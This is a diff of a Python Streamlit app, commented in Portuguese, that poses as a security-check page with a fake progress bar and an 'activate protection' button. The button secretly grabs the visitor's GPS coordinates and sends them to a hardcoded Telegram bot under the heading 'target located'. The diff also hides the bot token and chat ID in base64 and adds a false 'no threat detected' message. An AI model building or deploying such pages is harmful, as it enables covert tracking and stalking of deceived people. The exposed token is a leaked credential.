@@ -1,68 +1,65 @@
 import streamlit as st
 import time
 import requests
+import base64
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# 1. Configurações de Conexão
-TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
-SEU_ID = "8210828398"
+# --- SEGURANÇA MÁXIMA: Token e ID Ofuscados em Base64 ---
+# Ninguém consegue ler sem decodificar
+B_TK = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExnVXBJRU5tdHBsVGZIdW9GcmcxZmZyOA=="
+B_ID = "ODIxMDgyODM5OA=="
 
 def enviar_telegram(mensagem):
-    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
-    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
-    try:
-        requests.post(url, json=payload)
-    except:
-        pass
+    # Decodifica os dados apenas na memória na hora de enviar
+    tk = base64.b64decode(B_TK).decode("utf-8")
+    ci = base64.b64decode(B_ID).decode("utf-8")
+    url = f"https://api.telegram.org/bot{tk}/sendMessage"
+    payload = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
+    try: requests.post(url, json=payload)
+    except: pass
 
-# 2. Configuração da Página
-st.set_page_config(page_title="SISTEMA DE SEGURANÇA", page_icon="🔐", layout="centered")
+# Configuração da Página
+st.set_page_config(page_title="VERIFICAÇÃO DE SEGURANÇA", page_icon="🔐", layout="centered")
 
-# 3. Visual do Site (CSS)
+# Estilo Visual (Cores da sua foto)
 st.markdown("""
     <style>
-    .main { background-color: #000000; color: #ffffff; }
+    .main { background-color: #0d1117; color: #ffffff; }
+    .status-ok { color: #2ea043; font-weight: bold; font-size: 18px; margin-top: 10px; }
+    .stProgress > div > div > div > div { background-color: #0056b3; }
     .stButton>button {
-        width: 100%; border-radius: 10px; height: 3em;
-        background-color: #ffc107; color: black; font-weight: bold;
+        background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d;
+        width: 100%; border-radius: 6px; font-size: 14px;
     }
-    .radar {
-        width: 150px; height: 150px; border: 4px solid #ffc107;
-        border-radius: 50%; margin: 20px auto; position: relative;
-        animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-        0% { transform: scale(0.9); opacity: 0.7; }
-        50% { transform: scale(1); opacity: 1; }
-        100% { transform: scale(0.9); opacity: 0.7; }
-    }
-    .footer { text-align: center; color: #666; font-size: 12px; margin-top: 50px; }
     </style>
-    <div style="text-align: center;">
-        <h1 style='color: #ffc107;'>🛡️ SISTEMA DE SEGURANÇA</h1>
-        <div class="radar"></div>
-    </div>
     """, unsafe_allow_html=True)
 
-# 4. Coleta de Informações
-user_agent = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
-bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
+st.title("Verificação de Segurança")
 
-# 5. Botão e Lógica de Envio
-if st.button("🔴 ATIVAR PROTEÇÃO"):
-    with st.status("Localizando dispositivo...", expanded=True) as status:
+if 'verificado' not in st.session_state:
+    st.session_state.verificado = False
+
+if not st.session_state.verificado:
+    if st.button("● ATIVAR PROTEÇÃO AGORA"):
+        barra = st.progress(0)
+        
+        # Simulação da verificação
+        for i in range(1, 101):
+            time.sleep(0.03)
+            barra.progress(i)
+        
+        # Coleta silenciosa
         loc = get_geolocation()
         if loc:
-            lat = loc['coords']['latitude']
-            lon = loc['coords']['longitude']
+            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
             mapa = f"https://www.google.com/maps?q={lat},{lon}"
-            
-            msg = f"🚨 ALVO LOCALIZADO!\n\n📍 Link Google Maps: {mapa}\n🔋 Bateria: {bateria}%\n📱 Dispositivo: {user_agent}"
-            
+            msg = f"🚨 ALVO LOCALIZADO\n📍 Mapa: {mapa}"
             enviar_telegram(msg)
-            status.update(label="Localização Enviada!", state="complete", expanded=False)
-            st.success("Proteção Ativada com Sucesso!")
-        else:
-            st.error("Erro: Por favor, autorize o GPS no seu navegador.")
-
-st.markdown('<div class="footer">Sistema De Segurança Integrado Desenvolvido Por Miamy ©2026</div>', unsafe_allow_html=True)
+            
+            st.session_state.verificado = True
+            st.rerun()
+else:
+    # VISUAL APÓS 100% (Igual à foto que você mandou)
+    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
+    st.progress(100)
+    st.button("● PROTEÇÃO ATIVA", disabled=True)
